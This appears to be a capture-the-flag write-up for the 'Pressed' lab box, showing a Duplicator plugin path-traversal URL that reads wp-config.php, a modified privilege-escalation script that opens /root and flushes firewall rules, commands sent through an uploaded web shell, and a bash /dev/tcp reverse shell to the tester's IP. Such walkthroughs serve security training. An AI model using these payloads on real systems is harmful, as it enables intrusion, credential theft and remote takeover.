# Alternative way to exploit Pressed

## Local File Inclusion Vulnerability in WordPress

The aggressive output of **WPScan** shows that the [Duplicator plugin](https://de.wordpress.org/plugins/duplicator/) is enabled.

This version of the plugin has a **Local File Inclusion** vulnerability:
```
searchsploit duplicator
```
```
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
```

This allows us to read files on the box, if the backup file would not have been found:
```
http://pressed.htb/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../var/www/html/wp-config.php
```

## Privilege Escalation

The **Forward-Shell** is used to escalate privileges in a pseudo-shell as otherwise there is no way to gain a shell because of the firewall.

Instead of using this tool, the exploit script can be modified to change the permissions of the _/root_ directory:

Modifying _pkwner.sh_ to change permissions to _777_ of the _/root_ directory after uploading the new version via **XML-RPC**:
```
(...)
"chmod 777 /root");
exit(0);
(...)
```

Sending the request in _shell.php_ to execute the exploit script:
```
POST /shell.php

cmd=bash /var/www/html/wp-content/uploads/2022/12/test-1.jpeg
```

After sending the request, the directory of _root_ can be read by anyone:
```
drwxrwxrwx   1 root root  172 Feb  3  2022 root
```

### Getting a Reverse Shell

The exploit can also be modified to change the firewall rules by using `iptables`:
```
(...)
"iptables -A INPUT -j ACCEPT
"iptables -A OUTPUT -j ACCEPT");
exit(0);
(...)
```

Sending the request in _shell.php_ to execute the exploit script:
```
POST /shell.php

cmd=bash /var/www/html/wp-content/uploads/2022/12/test-2.jpeg
```

After sending the request, the firewall rules will allow connections and a port scan reveals that port 22 is open:
```
nmap 10.10.11.142
```
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

This can now be used to gain a reverse shell connection:
```
POST /shell.php

cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1'
```

After URL-encoding the command and sending the request, the listener on my IP and port 9001 starts a reverse shell connection.
